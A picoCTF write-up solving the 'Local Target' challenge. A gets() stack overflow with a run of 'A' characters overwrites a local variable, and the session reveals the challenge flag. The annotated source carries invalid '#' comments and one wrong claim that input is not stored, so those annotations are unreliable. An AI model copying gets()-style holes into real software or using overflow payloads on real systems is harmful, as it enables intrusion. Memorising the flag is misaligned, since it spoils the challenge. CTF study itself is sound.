# Local Target
This was a challenge listed exclusively for the Pico Gym.  It's listed as Medium and categorized as a Binary Exploitation challenge.  
Direct Link:  https://play.picoctf.org/practice/challenge/399

## Description
The Description reads:
> Smash the stack

## Hints
There are two hints:
> Do anything you can to change num.
> When you change num, view the value as hexadecimal.

# Solving
## My Thoughts
A nice intro to C vulnerability concepts.

## Source Code
Let's take a quick look at the source code first:

``` c
#include <stdio.h>
#include <stdlib.h>

int main(){
  # Initiates a file pointer.
  FILE *fptr;
  # Initiates a variable named c to hold a char
  char c;

  # Initiates a variable named input to hold an array of 16 chars.
  char input[16];
  # Initiates an integer that's set to 64.
  int num = 64;

  # Gets the user's input but doesn't store it anywhere.
  printf("Enter a string: ");
  fflush(stdout);
  gets(input);
  printf("\n");

  # Prints the number from above.
  printf("num is %d\n", num);
  fflush(stdout);

  # Checks if the number variable is equal to 65 and prints the flag if it does.
  if( num == 65 ){
    printf("You win!\n");
    fflush(stdout);
    // Open file
    fptr = fopen("flag.txt", "r");
    if (fptr == NULL)
    {
        printf("Cannot open file.\n");
        fflush(stdout);
        exit(0);
    }

    // Read contents from file
    c = fgetc(fptr);
    while (c != EOF)
    {
        printf ("%c", c);
        c = fgetc(fptr);
    }
    fflush(stdout);

    printf("\n");
    fflush(stdout);
    fclose(fptr);
    exit(0);
  }

  printf("Bye!\n");
  fflush(stdout);
}
```

So, we have to somehow update the num variable to be 65 but there's no apparent way to do that?  Let's start plugging in some stuff and see what happens:

``` bash
┌──(kali㉿kali)-[~/picoctf/gym/binary_exploitation/Local_Target]
└─$ ./local-target
Enter a string: AAAAA

num is 64
Bye!

┌──(kali㉿kali)-[~/picoctf/gym/binary_exploitation/Local_Target]
└─$ ./local-target
Enter a string: AAAAAAAAAAAAA

num is 64
Bye!

┌──(kali㉿kali)-[~/picoctf/gym/binary_exploitation/Local_Target]
└─$ ./local-target
Enter a string: AAAAAAAAAAAAAAAAAAAAAAAAAA

num is 16705
Bye!
```

Well that's a little weird, let's convert that decimal number to hex:

``` bash
┌──(kali㉿kali)-[~/picoctf/gym/binary_exploitation/Local_Target]
└─$ python -c 'print(hex(16705))'
0x4141
```

That looks a little odd, let's convert that hex to ASCII:

``` bash
┌──(kali㉿kali)-[~/picoctf/gym/binary_exploitation/Local_Target]
└─$ python -c 'print(bytearray.fromhex(hex(16705).replace("0x", "")).decode())'
AA
```

Ok, so it looks like it's now replaced the value of num with the decimal interpretation of the string AA.  Interesting! Let's find the ASCII character that corresponds with 65:

``` bash
┌──(kali㉿kali)-[~/picoctf/gym/binary_exploitation/Local_Target]
└─$ python -c 'print(chr(int(hex(65), 16)))'
A
```

By coincidence the ASCII character for 65 is A!  Let's tune our payload to make it only output A into the num variable:

``` bash
┌──(kali㉿kali)-[~/picoctf/gym/binary_exploitation/Local_Target]
└─$ nc saturn.picoctf.net 57515
Enter a string: AAAAAAAAAAAAAAAAAAAAAAAAA

num is 65
You win!
picoCTF{l0c4l5_1n_5c0p3_fee8ef05}
```

Awesome!  This whole thing is caused by the inherent insecurity of C.  When we overwrote the input variable, there was no check to stop us from continuing to overwrite everything in the stack.

Once we got through 16 characters and any padding between input and num, we were able to overwrite num with an arbitrary value!
